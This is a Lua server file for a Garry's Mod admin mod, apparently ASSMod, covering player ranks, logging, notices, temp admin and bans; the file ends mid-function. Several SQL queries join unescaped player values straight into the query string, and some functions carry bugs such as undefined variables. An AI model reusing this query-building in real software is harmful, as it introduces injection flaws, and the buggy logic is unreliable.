mysql = {
	QUERY_FIELDS = 1,
}
print( "opening ASS" )
AddCSLuaFile("autorun/ass.lua")
print( "opening ASS1" )
AddCSLuaFile("ass_shared.lua")
print( "opening ASS2" )
AddCSLuaFile("ass_client.lua")
print( "opening ASS3" )
AddCSLuaFile("oc_chat.lua")
print( "opening ASS4" )
AddCSLuaFile("oc_vote_cl.lua");
print( "opening ASS5" )
AddCSLuaFile("cl_nwvars.lua");
print( "opening ASS6" )

include("ass_shared.lua")
print( "opening ASS7" )
include("ass_cmd.lua")
print( "opening ASS8" )
include("ass_res.lua")
print( "opening ASS9" )
include("oc_ass_reqs.lua")
print( "opening ASS10" )
include("sv_nwvars.lua");
print( "opening ASS11" )

PE_COMMANDS = {};

function OC_GetIP(ply)
	local ip = ply:IPAddress()
	local ExplodedIP = string.Explode( ":", tostring(ip) )
	return tostring(ExplodedIP[1])
end

function KickDupes( ply, cmd, args )
	local results = mysql.query(ForumDatabase, "SELECT * FROM `smfoc_members` WHERE `STEAM_ID` = '".. ply:SteamID() .."'")
	if #results >= 1 then ply:Kick("Duplicate accounts are not allowed!") end
end

function RetrieveDJRank( ply )
	/*tmysql.query( "SELECT `additionalGroups` FROM `smfoc_members` WHERE `STEAM_ID` = '".. ply:SteamID() .."'",
	function( results, s, err )
		print( "DJ_E: ".. err )
		PrintTable(results)
		if results and #results >= 1 then
			ply.AddGroups = string.Explode( ",", results[1][1] )
			print(ply.AddGroups)
			for k, v in pairs( ply.AddGroups ) do
				print( "D: ".. k .. " V: ".. v )
				if tostring(v) == tostring(18) or tostring(v) == tostring(19) then
					print( "cosmosfmdj" )
					ply.CosmosFMDJ = true
					umsg.Start("CFM_DJ", ply )
					umsg.End()
				end
			end
		end
	end )*/
end

/*function AdminDisg ( Player )
	if !Player:IsAdmin() then return false; end
	
	Player:SetNetworkedBool('pe_dis', !Player:GetNetworkedBool('pe_dis', false))
	
	if Player:GetNetworkedBool('pe_dis', false) then
		Player:PrintMessage(HUD_PRINTTALK, 'Disguise mode activated.\n');
	else
		Player:PrintMessage(HUD_PRINTTALK, 'Disguise mode deactivated.\n');
	end
end
concommand.Add('disguise', AdminDisg);

function AddChatCommand ( Name, Func ) PE_COMMANDS[Name] = Func; end
function RemoveChatCommand ( Name ) PE_COMMANDS[Name] = nil; end

function PE_ChatCommands ( Player, Text, Bool )
	local ExplodedString = string.Explode(" ", string.lower(Text));
	
	if string.find(Text, "!") == 1 or string.find(Text, "/") == 1 then
		local Command = nil;
		local CommandN = '';
		
		for k, v in pairs(PE_COMMANDS) do
			local K = string.gsub(k, '!!EMPTY!!', '');
			local Sub = string.sub(Text, 1, string.len(k) + 1);
			
			if Sub == '!' .. K or Sub == '/' .. K then			
				Command = v;
				
				if string.find(Text, '!' .. K .. ' ') or string.find(Text, '/' .. K .. ' ') then
					CommandN = string.gsub(string.gsub(Text, '!' .. K .. ' ', ''), '/' .. K .. ' ', '');
				else
					CommandN = string.gsub(string.gsub(Text, '!' .. K, ''), '/' .. K, '');
				end
				break;
			end
		end
		
		if Command then
			PCallError(Command, Player, Text, Bool, CommandN);
		else
			Player:PrintMessage(HUD_PRINTTALK, "No such command.");
		end
		
		return "";
	else
		if Bool then			
			if PE_CHAT_OVERRIDE then
				return PE_CHAT_OVERRIDE(Player, Text);
			else
				umsg.Start('PE_LOCALCHAT');
					umsg.Entity(Player);
					umsg.String(Text);
				umsg.End();
				
				Msg(Player:Nick() .. ": " .. Text .. "\n");
				return "";
			end
		else
			local ServerID = ChatName or "Dev";
			MySQLQuery(SiteDatabaseConnection, "INSERT INTO `global_chat` (`server_id`, `user_name`, `message`) VALUES ('" .. StripForHTTP(ServerID) .. "', '" .. StripForHTTP(Player:Name()) .. "', '" .. StripForHTTP(Text) .. "')");
		
			umsg.Start('PE_GLOBALCHAT');
				umsg.Entity(Player);
				umsg.String(Text);
			umsg.End();
			
			Msg(Player:Nick() .. ": " .. Text .. "\n");
			return "";
		end
	end
end
hook.Add("PlayerSay", "PE_ChatCommands", PE_ChatCommands);

//function PE_ServerBroadcast ( Player, Text, LessCommand )
	//if Player:GetLevel() > 2 then return false; end
	//MySQLQuery(SiteDatabaseConnection, "INSERT INTO `global_chat` (`server_id`, `user_name`, `message`) VALUES ('SVRBRD', 'SVRBRD', '" .. StripForHTTP(string.gsub(LessCommand) .. "')");
//end
//AddChatCommand('broadcast', PE_ServerBroadcast);

function PE_BeginGlobalChat ( )
	CurRecNum = 0;
	
	local Stuff = MySQLQuery(SiteDatabaseConnection, "SELECT `num` FROM `global_chat` ORDER BY `num` DESC LIMIT 1");
	
	CurRecNum = tonumber(Stuff[1][1]);
	
	MySQLQuery(SiteDatabaseConnection, "DELETE FROM `global_chat` WHERE `num`<'".. CurRecNum - 5 .."'");
	
	timer.Create("PE_DownloadGlobalChat", 1, 0, PE_DownloadGlobalChat);
end
timer.Simple(1, PE_BeginGlobalChat);

function PE_DownloadGlobalChat ( )
	local ServerID = ChatName or "Dev";
	local Chat = MySQLQuery(SiteDatabaseConnection, "SELECT * FROM `global_chat` WHERE `num`>'" .. CurRecNum .. "' AND `server_id`!='" .. ServerID .. "'", mysql.QUERY_FIELDS);
	
	for k, v in pairs(Chat) do			
		umsg.Start('PE_OFFSERVER_CHAT');
			umsg.String(v['user_name']);
			umsg.String(v['message']);
			umsg.String(v['server_id']);
		umsg.End();
		
		if tonumber(v['num']) > CurRecNum then CurRecNum = tonumber(v['num']) end
	end
end*/

local NumQueries = 0;
local TotalNumQueries = 0;
function MySQLQuery ( Database, String, Type )
	NumQueries = NumQueries + 1;
	TotalNumQueries = TotalNumQueries + 1;
	timer.Simple(10, function ( ) NumQueries = NumQueries - 1; end);
	local Results, Status, Error = {}, 0, 0
	//local R, S, E = mysql.query(Database, String, Type);
	tmysql.query( String, function( R, S, E )
		print( "running query" )
		PrintTable( R )
		print( "Error: ".. E )
		if !R then print( "no results") end
		if !S then
			Msg("MySQL Query Failed\n" .. E .. "\n");
	
			if !file.Exists("mysql_fail_log.txt") then file.Write("mysql_fail_log.txt", ""); end
		
			file.Write("mysql_fail_log.txt", file.Read("mysql_fail_log.txt") .. "[ " .. os.time() .. " ] MySQL Query Error Report\nERROR: '" .. E .. "'\nQUERY: '" .. String .. "'\n");
		
			if string.find(E, "gone away") and GAMEMODE.ConnectToMySQL then
				GAMEMODE.ConnectToMySQL();
				file.Write("mysql_fail_log.txt", file.Read("mysql_fail_log.txt") .. "[ " .. os.time() .. " ] RECONNECTING TO DATABASE\n");
			end
		end
		//return R, S, E
		Results, Status, Error = R, S, E
	end, Type)
	return Results, Status, Error
end

local OldUMsgStart = umsg.Start;
local NumUMsg = 0;
local TotalNumUMsg = 0;
/*function umsg.Start ( O, T )
	if T and !T:IsValid() then return false; end

	NumUMsg = NumUMsg + 1;
	TotalNumUMsg = TotalNumUMsg + 1;
	timer.Simple(10, function ( ) NumUMsg = NumUMsg - 1; end);
	
	OldUMsgStart(O, T);
end*/

function MYSQLQPS ( Player, Command, Args )
	Player:PrintMessage(HUD_PRINTCONSOLE, "-- RECENT --\n");
	Player:PrintMessage(HUD_PRINTCONSOLE, "MySQL Queries Per Second: " .. math.Round(NumQueries / 10) .. "\n");
	Player:PrintMessage(HUD_PRINTCONSOLE, "User Messages Per Second: " .. math.Round(NumUMsg / 10) .. "\n");
	Player:PrintMessage(HUD_PRINTCONSOLE, "-- TOTAL --\n");
	Player:PrintMessage(HUD_PRINTCONSOLE, "MySQL Queries Per Second: " .. math.Round(TotalNumQueries / CurTime()) .. "\n");
	Player:PrintMessage(HUD_PRINTCONSOLE, "User Messages Per Second: " .. math.Round(TotalNumUMsg / CurTime()) .. "\n");
end
concommand.Add('pe_band', MYSQLQPS);

// SERVER LOGGING STUFF

function ASS_NewLogLevel( ID )	_G[ ID ] = ID		end

ASS_NewLogLevel("ASS_ACL_JOIN_QUIT")
ASS_NewLogLevel("ASS_ACL_SPEECH")
ASS_NewLogLevel("ASS_ACL_BAN_KICK")
ASS_NewLogLevel("ASS_ACL_RCON")
ASS_NewLogLevel("ASS_ACL_PROMOTE")
ASS_NewLogLevel("ASS_ACL_ADMINSPEECH")

local ActiveNotices = {}
local PlayerRankings = {}
local ChatLogFilter = { ASS_ACL_JOIN_QUIT, ASS_ACL_SPEECH }

function ASS_IsLan()	return !SinglePlayer() && (GetConVarNumber("sv_lan") != 0)	end

// When a console command is run on a dedicated server, the PLAYER argument is a
// NULL ENTITY. We setup this meta table so that the IsAdmin etc commands still work
// and return the appropriate level.

local CONSOLE = FindMetaTable("Entity")
function CONSOLE:IsSuperAdmin()		if (!self:IsValid()) then return true else return false end end
function CONSOLE:IsAdmin()		if (!self:IsValid()) then return true else return false end end
function CONSOLE:IsTempAdmin()		if (!self:IsValid()) then return true else return false end end
function CONSOLE:IsRespected()		if (!self:IsValid()) then return true else return false end end
function CONSOLE:IsGuest()		if (!self:IsValid()) then return false else return true end end
function CONSOLE:IsUnwanted()		if (!self:IsValid()) then return false else return true end end
function CONSOLE:GetLevel()		if (!self:IsValid()) then return ASS_LVL_SERVER_OWNER else return ASS_LVL_GUEST end end
function CONSOLE:HasLevel(n)		if (!self:IsValid()) then return ASS_LVL_SERVER_OWNER <= n else return ASS_LVL_GUEST <= n end end
function CONSOLE:IsBetterOrSame(PL2)	if (!self:IsValid()) then return ASS_LVL_SERVER_OWNER <= PL2:GetNetworkedInt("ASS_isAdmin") else return ASS_LVL_GUEST <= PL2:GetNetworkedInt("ASS_isAdmin") end end
function CONSOLE:GetTAExpiry(n)		if (!self:IsValid()) then return 0		end end
function CONSOLE:AssId()		if (!self:IsValid()) then return "CONSOLE"	end end
function CONSOLE:SteamID()		if (!self:IsValid()) then return "CONSOLE"	end end
function CONSOLE:IPAddress()		if (!self:IsValid()) then return "CONSOLE"	end end
function CONSOLE:InitLevel()					end
function CONSOLE:SetUnBanTime()					end
function CONSOLE:SetLevel(RANK)					end
function CONSOLE:SetAssAttribute(NAME,VAL)			end
function CONSOLE:GetAssAttribute(NAME, TYPE, DEFAULT)		end
function CONSOLE:SetTAExpiry(TIME)				end
function CONSOLE:Hurt(AMT)					end
function CONSOLE:Nick()			if (!self:IsValid()) then return "Console"	end end
function CONSOLE:PrintMessage(LOC, MSG)		if (LOC == HUD_PRINTCONSOLE || LOC == HUD_PRINTNOTIFY) then Msg(MSG) end end
function CONSOLE:ChatPrint(MSG)				end
CONSOLE = nil

local PLAYER = FindMetaTable("Player")

function PLAYER:InitLevel()	
	if (PlayerRankings[ self:AssId() ]) then
		self:SetLevel(PlayerRankings[ self:AssId() ].Rank)
	else
		self:SetLevel(ASS_LVL_GUEST)
	end
end

function PLAYER:SetUnBanTime( TM )
	local ID = self:AssId()
	if (!PlayerRankings[ID]) then return end
	PlayerRankings[ ID ].UnbanTime = TM
end

function PLAYER:SetLevel( RANK )	
		
		print("Setting Level, ".. self:Nick() .." to ".. RANK )
		self:SetNetworkedInt("ASS_isAdmin", RANK )

		local ID = self:AssId()
		
		PlayerRankings[ ID ] = PlayerRankings[ ID ] or {}
		PlayerRankings[ ID ].Rank = RANK
		PlayerRankings[ ID ].Name = self:Nick()
		PlayerRankings[ ID ].PluginValues = PlayerRankings[ ID ].PluginValues or {}
		if (RANK == ASS_LVL_TEMPADMIN) then
			PlayerRankings[ ID ].Rank = ASS_LVL_RESPECTED
		end
	
		ASS_Debug( self:Nick() .. " given level " .. self:GetLevel() .. "\n")

		ASS_RunPluginFunction( "RankingChanged", nil, self )
	
end

function PLAYER:SetAssAttribute(NAME, VALUE)
	if (type(NAME) != "string") then return end
	if (type(VALUE) != "string" && type(VALUE) != "number" && type(VALUE) != "boolean" && type(VALUE) != "nil") then return end
	
	NAME = string.lower(NAME)
		
	local ID = self:AssId()
	if (!PlayerRankings[ ID ]) then
		self:SetLevel(ASS_LVL_GUEST)
	end
	if (!PlayerRankings[ ID ].PluginValues) then
		PlayerRankings[ ID ].PluginValues = {}
	end
	PlayerRankings[ ID ].PluginValues[NAME] = VALUE
	
	ASS_SaveRankings()
end

function PLAYER:GetAssAttribute(NAME, TYPE, DEFAULT)
	if (type(NAME) != "string") then  return DEFAULT end
	
	local convertFunc = nil
	if (TYPE == "string") then	convertFunc = tostring
	elseif (TYPE == "number") then	convertFunc = tonumber
	elseif (TYPE == "boolean") then	convertFunc = util.tobool
	else
		// Msg("SetAssAttribute error - Type invalid\n")
		return DEFAULT
	end

	NAME = string.lower(NAME)
	
	local ID = self:AssId()
	if (!PlayerRankings[ ID ]) then
		return convertFunc(DEFAULT)
	end
	if (!PlayerRankings[ ID ].PluginValues) then
		return convertFunc(DEFAULT)
	end
	if (PlayerRankings[ self:AssId() ].PluginValues[NAME] == nil) then
		return convertFunc(DEFAULT)
	end
	
	local result = convertFunc(PlayerRankings[ self:AssId() ].PluginValues[NAME])
	if (result == nil) then
		return convertFunc(DEFAULT)
	else
		return result
	end
end

function PLAYER:SetTAExpiry(TIME)	
	self:SetNetworkedFloat("ASS_tempAdminExpiry", TIME)
end

function PLAYER:Hurt(HEALTH)
	local newHealth = self:Health() - HEALTH
	if (newHealth <= 0) then
		self:SetHealth(0)
		self:Kill()
	else
		self:SetHealth(newHealth)
	end
end
PLAYER = nil

// SERVER ONLY
function ASS_TellAdmins( PLAYER, ACL, ACTION )

	for k,v in pairs(ChatLogFilter) do if (v == ACL) then return end end

	for _, pl in pairs(player.GetAll()) do

		if (pl:IsTempAdmin()) then

			pl:ChatPrint( PLAYER:Nick() .. ": " .. ACTION )

		end

	end

end

function ASS_GetRankingTable()
	return PlayerRankings
end

function ASS_LogAction( PLAYER, ACL, ACTION, OPTIONAL )
	// Msg("[" .. os.date("%H:%M:%S") .. "] " ..  PLAYER:Nick() .. " -> " .. ACTION .. "\n")
	
	if !ACL then return false; end
	if !Player then return false; end
	if !ACTION then return false; end
	if !OPTIONAL then return false; end
	
	if (util.tobool( ASS_Config["tell_admins_what_happened"] )) then
		for k, v in pairs(player.GetAll()) do
			if v:GetLevel() == 0 then
				v:PrintMessage(HUD_PRINTTALK, "USER:" .. PLAYER:Nick() .. " | ACTION:" .. ACL .. " | AFFECTED:" .. ACTION .. " | OPTIONAL:" .. tostring(OPTIONAL));
			end
		end
	end
	
	ASS_RunPluginFunction("AddToLog", nil, PLAYER, ACL, ACTION, OPTIONAL)
end

function ASS_LoadRankings()
	ASS_RunPluginFunction("LoadRankings")
end

function ASS_SaveRankings()
	ASS_RunPluginFunction("SaveRankings")
end

function ASS_Initialize()

	ASS_InitResources()
	ASS_LoadPlugins()
	ASS_LoadRankings()

end

function dataExist()
	if (!sql.TableExists("FWPD")) then
		local query = "CREATE TABLE FWPD ( SteamID varchar(255), Class varchar(255) )"
		local result = sql.Query(query)
		print("***********************************: Table CREATED")
	else
		print("***********************************: Table EXISTS")
	end
end
hook.Add( "Initialize", "Initialize", dataExist )

function createuser(ply)
	
	ply:SetLevel(5)
	print("*****DEBUG*****: "..tonumber(5).." NEW ")
	sql.Query( "INSERT INTO FWPD (`Class`, `SteamID`) VALUES ( '"..ply:GetLevel().."', '"..ply:SteamID().."' )" )
	
	local steamid = ply:SteamID()
	timer.Create("saveTimer_"..steamid, 10, 0, function() 
		if !ValidEntity(ply) then 
			timer.Destroy("saveTimer_"..steamid) 
			return 
		end 
		SaveData(ply) 
	end)
end

/*function CheckTHEGROUP(ply)
	
	//print("DEBUG: STEAMID is "..ply:SteamID().."")
	
	local num = sql.QueryValue("SELECT Class FROM FWPD WHERE SteamID='"..ply:SteamID().."'") 
	
	local val = tonumber(tostring(num))
	
	if !val then 
		createuser(ply)
		return
	end

	ply:SetLevel(val)
	
	if ply:SteamID() == "" then
		ply:SetLevel(1)
	end
	print("*****DEBUG*****: "..val.." NOT NEW ")

	local steamid = ply:SteamID()
	timer.Create("saveTimer_"..steamid,10,0,function() if !ValidEntity(ply) then timer.Destroy("saveTimer_"..steamid) return end SaveData(ply) end)

		//else
			//ply:ConCommand("OCReg")
		//end 
	//end) 
end
hook.Add("PlayerAuthed", "PlayerAuthedHOOK", CheckTHEGROUP)


function StartREG(ply, cmd, args)
	CheckTHEGROUP(ply)
end
concommand.Add("StartREG", StartREG)*/


function SaveData(pl)	
	local rank = tostring(pl:GetLevel())	
	
	//print("*******************************LEVEL*********************: "..rank)
	
	//sql.Query("UPDATE FWPD SET Class='"..rank.."' WHERE SteamID='"..pl:SteamID().."'")
	
end
hook.Add( "PlayerDisconnected", "PlayerDisconnectRANKHook", SaveData )


function ASS_PlayerInitialSpawn( PLAYER )

	RetrieveDJRank( PLAYER )
	PLAYER:ConCommand("ASS_CS_Initialize\n")
	PLAYER:ConCommand("StartREG")	
	PLAYER:SetNetworkedString('ASS_UniqueID', PLAYER:UniqueID());
		
	SendLog(PLAYER:Nick(), "PLAYER_JOIN", nil, nil)
	
	if (SinglePlayer() || PLAYER:IsListenServerHost()) then
	
		PLAYER:SetLevel(ASS_LVL_SERVER_OWNER)
		ASS_SaveRankings();
		
	/*else
	
		PLAYER:InitLevel()*/
	
	end
	
	for k,v in pairs(ActiveNotices) do
		ASS_SendNotice(PLAYER, v.Name, v.Text, v.Duration)
	end
	
	if (#player.GetAll() <= 2 && !PLAYER:IsTempAdmin() && util.tobool(ASS_Config["demomode"]) ) then
	
		local TempAdminTime = (tonumber(ASS_Config["demomode_ta_time"]) or 1) *60 
		PLAYER:SetLevel( ASS_LVL_TEMPADMIN )
		PLAYER:SetTAExpiry( CurTime() + TempAdminTime )

		ASS_NamedCountdown( PLAYER, "TempAdmin", "Temp Admin Expires in", TempAdminTime )
		ASS_SaveRankings();

		ASS_MessagePlayer( PLAYER, "Welcome to the ASSMod demo. Congratulations - you've been granted temporary admin")
		ASS_MessagePlayer( PLAYER, "Bind a key to +ASS_Menu to see the admin-menu (I recommend x):")
		ASS_MessagePlayer( PLAYER, "bind x \"+ASS_Menu\"")
	
	end

	ASS_Debug( PLAYER:Nick() .. " has access level " .. PLAYER:GetLevel() .. "\n")
end

function ASS_PlayerDisconnect( PLAYER )

	SendLog(PLAYER:Nick(), "PLAYER_DISCONNECT", nil, nil)

end

function ASS_PlayerSpeech( PLAYER, TEXT, TEAMSPEAK )

	local prefix = ASS_Config["admin_speak_prefix"]
	if (!prefix || prefix == "") then
		prefix = "@"
	end
	local prefixlen = #prefix

	if (PLAYER:IsTempAdmin() && string.sub(TEXT, 1, prefixlen) == prefix) then
	
		ASS_TellAdmins( PLAYER, ASS_ACL_ADMINSPEECH, string.sub(TEXT, prefixlen+1) )
		SendLog(PLAYER:Nick(), "ADMIN_ANNOUNCE", nil, TEXT)
		
		return ""
	
	end
	
	/*
	
	if (!TEAMSPEAK) then
		SendLog(PLAYER:Nick(), "PLAYER_SAY_TEAM", nil, TEXT)
	else
		SendLog(PLAYER:Nick(), "PLAYER_SAY_PUBLIC", nil, TEXT)
	end
	
	*/
	
end

function ASS_FindPlayerSteamOrIP( USERID )

	for _, pl in pairs(player.GetAll()) do

		if (pl:AssId() == USERID) then
			return pl
		end

	end

	return nil
end

function ASS_FindPlayerUserID( USERID )

	local UID = tonumber(USERID)
	if (UID) then
		for _, pl in pairs(player.GetAll()) do
	
			if (pl:UserID() == UID) then
		
				return pl
		
			end
	
		end
	end
	
	return ASS_FindPlayerSteamOrIP(USERID)
end

function ASS_FindPlayerName( NAME )

	local lNAME = string.lower(NAME)

	for _,pl in pairs(player.GetAll()) do
		local name = pl:Nick()
		if (string.lower(string.sub(name, 1, #lNAME)) == lNAME) then
			return pl
		end
	end

	return ASS_FindPlayerUserID(NAME)

end

function ASS_FindPlayer( UNIQUEID )
	
	if (!UNIQUEID) then return nil end

	local pl = player.GetByUniqueID(UNIQUEID)
	
	if (!pl || !pl:IsValid()) then 
		return ASS_FindPlayerName(UNIQUEID)
	end
	
	return pl

end

function ASS_MessagePlayer( PLAYER, MESSAGE )	
	PLAYER:PrintMessage(HUD_PRINTCONSOLE, MESSAGE)
	PLAYER:ChatPrint(MESSAGE)
end
function ASS_FullNick( PLAYER )			return "\"" .. PLAYER:Nick() .. "\" (" .. PLAYER:SteamID() .. " | " .. PLAYER:IPAddress() .. ")"		end

local DaysInMonth_Normal = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }
local DaysInMonth_Leap = { 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }

local function timeAdd( mins )

	local tmNow = os.date("*t")
	
	PrintTable(tmNow)
	
	local hours = math.floor(mins / 60)
	mins = mins - (hours * 60)
	
	local days = math.floor(hours / 24)
	hours = hours - (days * 24)

	tmNow.min = tmNow.min + mins
	if (tmNow.min >= 60) then
		tmNow.min = tmNow.min - 60
		hours = hours + 1
	end
	tmNow.hour = tmNow.hour + hours
	if (tmNow.hour >= 24) then
		tmNow.hour = tmNow.hour - 24
		days = days + 1
	end
	
	while (days > 0) do
	
		tmNow.day = tmNow.day + days
		
		// Leap year!
		local daysInmonth = DaysInMonth_Normal
		if (tmNow.year / 4 == math.floor(tmNow.year/4)) then
			daysInmonth = DaysInMonth_Leap
		end
		
		if (tmNow.day > daysInmonth[tmNow.month]) then
			days = days - (tmNow.day - daysInmonth[tmNow.month])
			
			tmNow.day = tmNow.day - daysInmonth[tmNow.month]
			tmNow.month = tmNow.month + 1
			if (tmNow.month > 12) then
				tmNow.month = 1
				tmNow.year = tmNow.year + 1
			end
		else
			break
		end
	
	end
end

local function timeExpired(tm)

	for k,v in pairs(tm) do
		k[v] = tonumber(v)
	end
	
	local tmNow = os.date("*t")
	
	if (tmNow.year > tm.year) then		
		return true
	elseif (tmNow.year == tm.year) then
		if (tmNow.month > tm.month) then		
			return true
		elseif (tmNow.month == tm.month) then
			if (tmNow.day > tm.day) then		
				return true
			elseif (tmNow.day == tm.day) then
				if (tmNow.hour > tm.hour) then
					return true
				elseif (tmNow.hour == tm.hour) then
					if (tmNow.min > tm.min) then
						return true
					elseif (tmNow.min == tm.min) then
						return tmNow.sec >= tm.sec
					end
				end
			end
		end
	end
	
	return false
	
end

local NextDateTimeSet = 0

function ASS_Think()
	
	for _, ply in pairs( player.GetAll() ) do
	
		if (ply:GetLevel() == ASS_LVL_TEMPADMIN && CurTime() >= ply:GetTAExpiry()) then
			
			SendLog(ply:Nick(), "LOST_TEMP_ADMIN", nil, nil)

			ply:SetLevel( ASS_LVL_RESPECTED )
			ASS_RemoveCountdown( ply, "TempAdmin" )

			ASS_SaveRankings();
			
		end
	
	end
	
	if (CurTime() >= NextDateTimeSet) then 
		//SetGlobalString( "ServerTime", os.date("%H:%M:%S") )
		//SetGlobalString( "ServerDate", os.date("%d/%b/%Y") )
		
		NextDateTimeSet = CurTime() + 1
		
		for k, v in pairs(PlayerRankings) do
			if (v.Rank == ASS_LVL_BANNED && v.UnbanTime && timeExpired(v.UnbanTime) ) then
				
				PlayerRankings[ ID_OR_IP ].Rank = ASS_LVL_GUEST
				PlayerRankings[ ID_OR_IP ].UnbanTime = nil
				ASS_SaveRankings();
				
			end
		end
		
	end
	
end

function ASS_SendNoticesRaw( PLAYER )

	for k,v in pairs(ActiveNotices) do
		umsg.Start("ASS_RawNotice", PLAYER)
			umsg.String( v.Name ) 
	  		umsg.String( v.Text ) 
	 		umsg.Float( v.Duration ) 
		umsg.End()
	end

end

function ASS_SendNotice( PLAYER, NAME, TEXT, DURATION )

	ASS_Debug("Sending notice \"" .. TEXT .. "\"\n")

	if (NAME) then
		umsg.Start("ASS_NamedNotice", PLAYER)
		umsg.String( NAME ) 
	else
		umsg.Start("ASS_Notice", PLAYER)
	end
	
  		umsg.String( ASS_FormatText(TEXT) ) 
 		umsg.Float( DURATION ) 
	umsg.End()

end

function ASS_GenerateFixedNoticeName( TEXT, DURATION )

	return "FIXED:" .. util.CRC( tostring(TEXT) .. tostring(DURATION) )

end

function ASS_AddFixedNotice( TEXT, DURATION ) 

	ASS_AddNamedNotice( ASS_GenerateFixedNoticeName(TEXT, DURATION) , TEXT, DURATION)
	
	table.insert( ASS_Config["fixed_notices"], { duration = DURATION, text = TEXT } )
	ASS_WriteConfig()
	
end

function ASS_AddNotice( TEXT, DURATION ) 

	ASS_AddNamedNotice(nil, TEXT, DURATION)
	
end

function ASS_AddNamedNotice( NAME, TEXT, DURATION ) 

	if (!NAME) then

		NAME = "NOTE:" .. util.CRC( tostring(TEXT) .. tostring(DURATION) .. tostring(CurTime()) .. tostring(#ActiveNotices) )

	end

	for k,v in pairs(ActiveNotices) do
	
		if (v.Name && v.Name == NAME) then
			table.remove(ActiveNotices, k)
			break
		end
	
	end
	
	//table.insert( ActiveNotices, { Name = NAME, Text = TEXT, Duration = DURATION } )

	//ASS_SendNotice(nil, NAME, TEXT, DURATION)
end

function ASS_FindNoteText( NAME )
	for k,v in pairs(ActiveNotices) do
		if (v.Name && v.Name == NAME) then
			return v.Text
		end
	end
	return nil
end

function ASS_RemoveNotice( NAME ) 

	for k,v in pairs(ActiveNotices) do
	
		if (v.Name && v.Name == NAME) then
			table.remove(ActiveNotices, k)
			break
		end
	
	end
	for k,v in pairs(ASS_Config["fixed_notices"]) do
		if (NAME == ASS_GenerateFixedNoticeName(v.text, v.duration)) then
			table.remove(ASS_Config["fixed_notices"], k)
			ASS_WriteConfig()
			break
		end
	end
	
	umsg.Start("ASS_RemoveNotice")
 		umsg.String( NAME ) 
 	umsg.End()
end


function ASS_Countdown( PLAYER, TEXT, DURATION ) 
	ASS_Debug("Countdown \"" .. TEXT .. "\" for " .. DURATION .. "\n")
	umsg.Start("ASS_Countdown", PLAYER)
 		umsg.String( TEXT ) 
 		umsg.Float( DURATION ) 
 	umsg.End()
end

function ASS_CountdownAll( TEXT, DURATION ) 
	ASS_Debug("Countdown \"" .. TEXT .. "\" for " .. DURATION .. "\n")
	umsg.Start("ASS_Countdown")
 		umsg.String( TEXT ) 
 		umsg.Float( DURATION ) 
 	umsg.End()
 end

function ASS_NamedCountdown( PLAYER, NAME, TEXT, DURATION ) 
	ASS_Debug("Countdown \"" .. TEXT .. "\" for " .. DURATION .. "\n")
	umsg.Start("ASS_NamedCountdown", PLAYER)
		umsg.String( NAME ) 
		umsg.String( TEXT ) 
		umsg.Float( DURATION ) 
	umsg.End()
end

function ASS_NamedCountdownAll( NAME, TEXT, DURATION ) 
	ASS_Debug("Countdown \"" .. TEXT .. "\" for " .. DURATION .. "\n")
	umsg.Start("ASS_NamedCountdown")
		umsg.String( NAME ) 
		umsg.String( TEXT ) 
		umsg.Float( DURATION ) 
	umsg.End()
end

function ASS_RemoveCountdown( PLAYER, NAME ) 
	umsg.Start("ASS_RemoveCountdown", PLAYER)
		umsg.String( NAME ) 
	umsg.End()
end

function ASS_RemoveCountdownAll( NAME ) 
	umsg.Start("ASS_RemoveCountdown")
		umsg.String( NAME ) 
	umsg.End()
end

function ASS_BeginProgress( PLAYER, NAME, TEXT, MAXIMUM ) 
	if (MAXIMUM == 0) then
		return 
	end

	umsg.Start("ASS_BeginProgress", PLAYER)
		umsg.String( NAME ) 
		umsg.String( TEXT ) 
		umsg.Float( MAXIMUM ) 
	umsg.End()
end

function ASS_IncProgress( PLAYER, NAME, INC ) 
	umsg.Start("ASS_IncProgress", PLAYER)
		umsg.String( NAME ) 
		umsg.Float( INC || 1 ) 
	umsg.End()
end

function ASS_EndProgress( PLAYER, NAME ) 
	umsg.Start("ASS_EndProgress", PLAYER)
		umsg.String( NAME ) 
	umsg.End()
end

function ASS_Promote( PLAYER, UNIQUEID, NEWRANK, TIME )

	if PLAYER:GetLevel() == 0 then

		local TO_CHANGE = ASS_FindPlayer(UNIQUEID)
		
		if (!TO_CHANGE) then
		
			ASS_MessagePlayer(PLAYER, "Player not found!\n")
			return

		end

		if (TO_CHANGE:IsBetterOrSame(PLAYER)) then
		
			ASS_MessagePlayer(PLAYER, "Access denied! \"" .. TO_CHANGE:Nick() .. "\" has same or better access then you.")
			return

		end
		
		local action = "promote"
		if (NEWRANK > TO_CHANGE:GetLevel()) then
			action = "demote"
		end

		if (NEWRANK <= PLAYER:GetLevel()) then
		
			ASS_MessagePlayer(PLAYER, "Access denied! Can't " .. action .. " to a higher or equal level then yourself")
			return			
		
		end
		
		if (NEWRANK == ASS_LVL_TEMPADMIN && TIME > tonumber(ASS_Config["max_temp_admin_time"])) then
			
			ASS_MessagePlayer(PLAYER, "Access denied! Can't set temp admin to longer then " .. ASS_Config["MAX_TEMP_ADMIN_TIME"] .. " minutes")
			return			

		end

		TO_CHANGE:SetLevel( NEWRANK )
		TO_CHANGE:SetTeam( NEWRANK );
		
		if (NEWRANK == ASS_LVL_TEMPADMIN) then
		
			TO_CHANGE:SetTAExpiry( CurTime() + (TIME*60) )
			ASS_NamedCountdown( TO_CHANGE, "TempAdmin", "Temp Admin Expires in", TIME * 60 )
		
		else
		
			TO_CHANGE:SetTAExpiry( 0 )
			ASS_RemoveCountdown( TO_CHANGE, "TempAdmin" )

		end

		SendLog(PLAYER:Nick(), "GAIN_TEMP", TO_CHANGE:Nick(), nil)
		ASS_SaveRankings();

	else
	
		ASS_MessagePlayer( PLAYER, "Access Denied!\n")

	end

end

function ASS_UnBanPlayer( PLAYER, IS_IP, ID_OR_IP )

	if (PLAYER:IsTempAdmin()) then

		if (ASS_RunPluginFunction( "AllowPlayerUnBan", true, PLAYER, IS_IP, ID_OR_IP )) then

			if (IS_IP) then
				asscmd.ConsoleCommand("removeip " .. ID_OR_IP .. "\n")
				asscmd.ConsoleCommand("writeip\n")
			else
				asscmd.ConsoleCommand("removeid " .. ID_OR_IP .. "\n")
				asscmd.ConsoleCommand("writeid\n")
			end
			
			if (PlayerRankings[ ID_OR_IP ]) then
				PlayerRankings[ ID_OR_IP ].Rank = ASS_LVL_GUEST
				PlayerRankings[ ID_OR_IP ].UnbanTime = nil
